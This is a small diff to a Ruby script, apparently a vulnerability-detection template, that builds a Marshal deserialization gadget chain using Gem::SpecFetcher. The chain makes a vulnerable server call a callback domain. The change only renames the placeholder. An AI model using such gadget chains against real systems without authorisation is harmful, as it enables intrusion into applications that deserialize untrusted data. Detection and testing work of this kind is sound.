@@ -61,7 +61,7 @@ def create_detection_gadget_chain(url)
   return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(call_url_gadget)])
 end
 
-url =  "{CALLBACK_URL}" # replace with URL to call in the detection gadget, for example: test.example.org/path, url should not have a query (?) component.
+url =  "{CALLBACK_DOMAIN}" # replace with URL to call in the detection gadget, for example: test.example.org/path, url should not have a query (?) component.
 detection_gadget_chain = create_detection_gadget_chain(url)
 
 # begin
